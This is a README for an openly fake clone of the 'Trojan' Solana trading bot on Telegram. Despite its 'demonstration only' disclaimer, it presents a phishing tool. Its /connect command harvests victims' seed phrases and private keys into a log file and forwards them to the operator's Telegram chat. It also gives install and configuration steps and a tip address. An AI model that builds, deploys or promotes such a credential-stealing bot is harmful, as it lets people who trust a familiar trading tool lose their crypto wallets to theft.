# DISCLAIMER

Use of this bot is for demonstration and informational purposes only. By studying this code, you can understand from the inside how this tool can work. I am not responsible for malicious use of my code.

# Fake Trojan Trading Bot v1.0

Almost a complete copy of the popular Trojan Bot for trading on the Solana blockchain (I saved time in some places, I will finalise some buttons in the future). This bot aims to collect all information complete logging of messages.


## Installation

1. Install required dependencies:
```bash
pip install -r requirements.txt
```

2. Configure the bot:
- Set your bot token in the `BOT_TOKEN` variable
- Set your admin chat ID in the `ADMIN_CHAT_ID` variable

3. Run the bot:
```bash
python main.py
```

## Usage

The bot supports the following commands:
- `/start` - Start the bot and display main menu
- `/connect` - Connect your wallet (Collects all info (seed phrases and PK's included) into a log file and also into private Telegram messages)
- `/admin` - Admin commands (restricted access)


## Tips
sol: ANGELmZCK9716w24AWuVuJJ5RzC7ZdD2TPTM5AF834kL
